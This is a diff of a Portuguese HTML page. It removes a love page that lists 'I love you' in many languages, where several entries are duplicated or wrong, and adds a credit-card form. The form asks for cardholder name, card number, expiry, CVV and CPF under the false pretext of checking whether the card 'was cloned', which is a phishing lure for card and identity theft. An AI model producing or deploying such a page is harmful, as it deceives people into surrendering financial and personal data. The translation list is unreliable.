@@ -1,182 +1,81 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Te amo em 100 idiomas</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Formulário Cartão de Crédito</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #E6E6FA; /* Fundo roxo claro */
-            margin: 0;
+            max-width: 400px;
+            margin: 50px auto;
             padding: 20px;
-            border-left: 10px solid #800080; /* Borda lateral roxa */
-            border-right: 10px solid #800080; /* Borda lateral roxa */
-        }
-        h1 {
-            text-align: center;
-            color: #333;
-            font-size: 2.5em;
-        }
-        .content {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            margin: 0 auto;
-            max-width: 800px;
-        }
-        ol {
-            padding-left: 20px;
-        }
-        li {
-            margin: 5px 0;
-            color: #333;
-            font-size: 1.2em;
-        }
-        .link {
-            display: block;
-            text-align: center;
-            margin-top: 20px;
-        }
-        iframe {
-            display: block;
-            margin: 20px auto;
             border: 1px solid #ccc;
             border-radius: 8px;
+            background-color: #f7f7f7;
         }
-
-        /* Estilos para telas pequenas (como celulares) */
-        @media screen and (max-width: 768px) {
-            h1 {
-                font-size: 2em; /* Menor tamanho de fonte para h1 */
-            }
-            .content {
-                padding: 15px; /* Reduzir o padding para celular */
-                max-width: 90%; /* Diminuir a largura para celulares */
-            }
-            li {
-                font-size: 1em; /* Reduzir o tamanho da fonte nas listas */
-            }
-            iframe {
-                width: 100%; /* Tornar o iframe responsivo */
-                height: 250px; /* Ajustar altura do iframe em telas pequenas */
-            }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        p {
+            margin-bottom: 20px;
+            font-size: 16px;
+            color: #555;
+        }
+        label {
+            display: block;
+            margin-top: 15px;
+            font-weight: bold;
+            color: #333;
+        }
+        input[type="text"],
+        input[type="number"],
+        input[type="month"],
+        input[type="password"] {
+            width: 100%;
+            padding: 8px;
+            margin-top: 5px;
+            box-sizing: border-box;
+            border: 1px solid #999;
+            border-radius: 4px;
+        }
+        button {
+            margin-top: 25px;
+            width: 100%;
+            padding: 10px;
+            background-color: #2c87f0;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #1a5ec8;
         }
     </style>
 </head>
 <body>
+    <h2>Formulário Cartão de Crédito</h2>
+    <p>Coloque os dados de seu cartão de crédito e veja se você já foi clonado.<br>Não esqueça do CPF.</p>
+    <form action="#" method="POST">
+        <label for="nome">Nome no cartão:</label>
+        <input type="text" id="nome" name="nome" required />
 
-    <h1>Carol, Te Amo</h1>
+        <label for="numero">Número do cartão:</label>
+        <input type="text" id="numero" name="numero" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required />
 
-    <div class="content">
-        <ol>
-            <li>I love you</li>
-            <li>Te amo</li>
-            <li>Je t'aime</li>
-            <li>Ti amo</li>
-            <li>Ich liebe dich</li>
-            <li>Eu te amo</li>
-            <li>我爱你 (Wǒ ài nǐ)</li>
-            <li>愛してる (Aishiteru)</li>
-            <li>사랑해요 (Saranghaeyo)</li>
-            <li>أحبك (Uhibbuka)</li>
-            <li>Я тебя люблю (Ya tebya lyublyu)</li>
-            <li>मैं तुमसे प्यार करता हूँ (Main tumse pyaar karta hoon)</li>
-            <li>Σ' αγαπώ (S'agapo)</li>
-            <li>Seni seviyorum</li>
-            <li>Jag älskar dig</li>
-            <li>Ik hou van jou</li>
-            <li>Rakastan sinua</li>
-            <li>Jeg elsker deg</li>
-            <li>Kocham cię</li>
-            <li>Miluji tě</li>
-            <li>Szeretlek</li>
-            <li>Te iubesc</li>
-            <li>Я тебе люблю (Ya tebe lyublyu)</li>
-            <li>ฉันรักเธอ (Chan rạk khuṇ)</li>
-            <li>אני אוהב אותך (Ani ohev otach)</li>
-            <li>Anh yêu em</li>
-            <li>আমি তোমায় ভালোবাসি (Āmi tōmāẏ bhālōbāsi)</li>
-            <li>Mahal kita</li>
-            <li>Nakupenda</li>
-            <li>Saya cinta padamu</li>
-            <li>Mi amas vin</li>
-            <li>Mwen renmen ou</li>
-            <li>Mahal kita</li>
-            <li>Maite zaitut</li>
-            <li>Volim te</li>
-            <li>Volim te</li>
-            <li>Volim te</li>
-            <li>Te dua</li>
-            <li>Volim te</li>
-            <li>Ľúbim ťa</li>
-            <li>Es tevi miilu</li>
-            <li>As tave myliu</li>
-            <li>Ma armastan sind</li>
-            <li>Ég elska tig</li>
-            <li>Inhobbok</li>
-            <li>მიყვარხარ (Miqvarxar)</li>
-            <li>Սիրում եմ քեզ (Sirum yem k’ez)</li>
-            <li>دوستت دارم (Doosetaan daaram)</li>
-            <li>زه تۀ سره مينه لرم (Za ta sara meena laram)</li>
-            <li>ਮੈਂ ਤੈਨੂੰ ਪਿਆਰ ਕਰਦਾ ਹਾਂ (Main tainu pyaar karda haan)</li>
-            <li>मी तुझ्यावर प्रेम करतो (Mi tuzhyavar prem karto)</li>
-            <li>నేను నిన్ను ప్రేమిస్తున్నాను (Nenu ninnu preminchutunnanu)</li>
-            <li>நான் உன்னை காதலிக்கிறேன் (Naan unnai kaadhalikkiren)</li>
-            <li>ನಾನು ನಿನ್ನನ್ನು ಪ್ರೀತಿಸುತ್ತಿದ್ದೇನೆ (Naanu ninnannu preetisuttene)</li>
-            <li>હું તને પ્રેમ કરું છું (Hun tane prem karu chu)</li>
-            <li>میں تم سے محبت کرتا ہوں (Main tumse mohabbat karta hoon)</li>
-            <li>ฉันรักเธอ (Chan rạk khuṇ)</li>
-            <li>እወድሻለሁ (Ewedihalehu)</li>
-            <li>איך ליב די (Ikh lib di)</li>
-            <li>Kuv hlub koj</li>
-            <li>Waan ku jeclahay</li>
-            <li>Njān ninne snēhikkunnu</li>
-            <li>Men seni sevaman</li>
-            <li>Мен сені сүйемін (Men seni süyemin)</li>
-            <li>Я цябе люблю (Ja tabe kahaju)</li>
-            <li>Ez hej te dikim</li>
-            <li>Nopp naa la</li>
-            <li>මට ඔයාට ආදරෙයි (Mata oyāṭa ādarayi)</li>
-            <li>Mahal kita</li>
-            <li>Main tainu pyaar karda haan</li>
-            <li>Nenu ninnu preminchutunnanu</li>
-            <li>Kuv hlub koj</li>
-            <li>I love you</li>
-            <li>Aroha ahau ki a koe</li>
-            <li>Kuyayki</li>
-            <li>Me dɔ wo</li>
-            <li>Āmi tōmāẏ bhālōbāsi</li>
-            <li>Ndiyakuthanda</li>
-            <li>Ngiyakuthanda</li>
-<li>Te quiero</li>
-<li>Ich liebe dich</li>
-<li>Eu te amo</li>
-<li>Je t'aime</li>
-<li>Ti amo</li>
-<li>Ik hou van jou</li>
-<li>Te amu</li>
-<li>Amo-te</li>
-<li>Szeretlek</li>
-<li>Miluji tě</li>
-<li>J'aime</li>
-<li>Minä rakastan sinua</li>
-<li>Jeg elsker deg</li>
-<li>Opštavam te</li>
-<li>Ik hou van jou</li>
-<li>Te amo muito</li>
-<li>Te adoram</li>
-<li>Te quiero mucho</li>
-<li>Fikir negn</li>
-<li>Amaphuphubhezi</li>
-<li>Hug te</li>
-        </ol>
+        <label for="validade">Validade (mês/ano):</label>
+        <input type="month" id="validade" name="validade" required />
 
-        <div class="image-container">
-            <iframe src="https://drive.google.com/file/d/11MFqcvcYxVjUR6gaZx_Up0SUtvp6wqVn/preview" width="640" height="480" allow="autoplay"></iframe>
-        </div>
-    </div>
+        <label for="cvv">CVV:</label>
+        <input type="password" id="cvv" name="cvv" maxlength="4" required />
 
+        <label for="cpf">CPF:</label>
+        <input type="text" id="cpf" name="cpf" maxlength="14" placeholder="000.000.000-00" required />
+
+        <button type="submit">Enviar</button>
+    </form>
 </body>
 </html>
